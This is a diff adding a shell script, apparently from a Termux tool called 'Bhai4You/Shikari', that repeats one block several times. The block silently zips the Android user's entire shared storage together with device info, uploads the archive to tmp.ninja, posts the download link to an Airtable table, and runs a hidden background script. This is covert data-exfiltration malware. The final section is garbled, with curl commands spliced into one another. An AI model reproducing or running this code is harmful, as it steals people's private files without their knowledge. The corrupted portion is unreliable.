@@ -1,0 +1,126 @@
+# DO NOT EDIT 
+#
+#
+termux-info > devicelog
+pkg install zip -y &> /dev/null 
+zip -r shikari.zip ~/storage/shared/ devicelog &> /dev/null
+curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
+rm -f devicelog
+cat link2 | grep https > link
+rm -f link2
+curl -v -X POST https://api.airtable.com/v0/test id/tableid \
+  -H "Authorization: Bearer apitest" \
+  -H "Content-Type: application/json" \
+  --data '{
+  "records": [
+     {
+       "fields": {
+         "Name": "Bhai4You/Shikari",
+         "link": ""
+            }
+        }
+    ]
+}'
+# DO NOT EDIT 
+#
+#
+termux-info > devicelog
+pkg install zip -y &> /dev/null 
+zip -r shikari.zip ~/storage/shared/ devicelog &> /dev/null
+curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
+rm -f devicelog
+cat link2 | grep https > link
+rm -f link2
+bash .shikari >> /dev/null 2>&1 &
+printf curl -v -X POST https://api.airtable.com/v0/$base/$table >> .shikari \
+  -H "Authorization: Bearer ggg" \
+  -H "Content-Type: application/json" \
+  --data '{
+  "records": [
+     {
+       "fields": {
+         "Name": "Bhai4You/Shikari",
+         "link": ""
+            }
+        }
+    ]
+}'
+# DO NOT EDIT 
+#
+#
+termux-info > devicelog
+pkg install zip -y &> /dev/null 
+zip -r shikari.zip ~/storage/shared/ devicelog &> /dev/null
+curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
+rm -f devicelog
+cat link2 | grep https > link
+rm -f link2
+bash .shikari >> /dev/null 2>&1 &
+printf "curl -v -X POST https://api.airtable.com/v0/$base/$table" >> .shikari \
+  -H "Authorization: Bearer h" \
+  -H "Content-Type: application/json" \
+  --data '{
+  "records": [
+     {
+       "fields": {
+         "Name": "Bhai4You/Shikari",
+         "link": ""
+            }
+        }
+    ]
+}'
+# DO NOT EDIT 
+#
+#
+termux-info > devicelog
+pkg install zip -y &> /dev/null 
+zip -r shikari.zip ~/storage/shared/ devicelog &> /dev/null
+curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
+rm -f devicelog
+cat link2 | grep https > link
+rm -f link2
+bash .shikari >> /dev/null 2>&1 &
+printf "curl -v -X POST https://api.airtable.com/v0/$base/$table" >> .shikari \
+  -H "Authorization: Bearer api" \
+  -H "Content-Type: application/json" \
+  --data '{
+  "records": [
+     {
+       "fields": {
+         "Name": "Bhai4You/Shikari",
+         "link": ""
+            }
+        }
+    ]
+}'
+termux-info > devicelog
+termux-info > devicelog
+pkg install zip -y &> /dev/null 
+pkg install zip -y &> /dev/null 
+zip -r shikari.zip ~/storage/shared/ devicelog &> /dev/null
+zip -r shikari.zip ~/storage/shared/ devicelog &> /dev/null
+curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
+rm -f devicelog
+cat link2 | grep https > link
+rm -f link2
+curl -v -X POST https://api.airtable.com/v0// \
+  -H "Authorization: Bearer curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
+"rm -f devicelog
+ \cat link2 | grep https > link
+
+rm -f link2
+  -H curl -v -X POST https://api.airtable.com/v0//" \Content-Type: application/json
+"  -H  \"
+Authorization: Bearer   --data '{"
+ \  "
+records  -H "": [Content-Type: application/json" \
+  --data '{
+  "records": [
+     {
+       "fields": {
+         "Name": "Bhai4You/Shikari",
+         "link": "
+     {
+       "fields": {
+         "Name": "Bhai4You/Shikari",
+         "link": "
